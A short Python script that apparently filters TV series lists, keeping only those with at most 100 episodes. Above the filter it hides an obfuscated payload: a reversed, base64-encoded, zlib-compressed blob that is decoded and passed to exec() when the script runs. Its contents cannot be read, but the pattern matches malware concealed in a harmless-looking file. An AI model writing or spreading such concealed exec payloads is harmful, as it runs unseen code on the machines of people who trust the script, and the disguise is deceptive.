MAX_EPISODES = 100

_ = lambda __ : __import__('zlib').decompress(
    __import__('base64').b64decode(__[::-1])
)

exec((_)(b'J5QiTMw//++8+36WCzhiOzvGIzyJ0n/YzSCYlS5mJ2DtVlz66tw7r7Ddl7Z14DX/YH0PYAi2i9N0OVAIC6Q9xALhch5owvcHxbRBKhDJr06coxjomkqXDwhpLtqDls+ACg2Vv6JE2rFClo0Pvax5AC5weI24fZGCrS+i6zSVfnOfZYun1GLcnJirO3xCaA+CN9ZDfUmTgJRsLMNvcxZ2hydk2nsmS2nuSuPR7MrbEXd+l8exJEowc3bBDavRE//HnRayPZQWQA/g'))

# ===== FILTER AFTER SCRIPT FINISHED =====

def _total_eps(series):
    try:
        return sum(
            len(season.get("episodes", []))
            for season in series.get("seasons", [])
        )
    except Exception:
        return 0

for _name in ("series_list", "results", "items"):
    if _name in globals() and isinstance(globals()[_name], list):
        globals()[_name][:] = [
            s for s in globals()[_name]
            if _total_eps(s) <= MAX_EPISODES
        ]
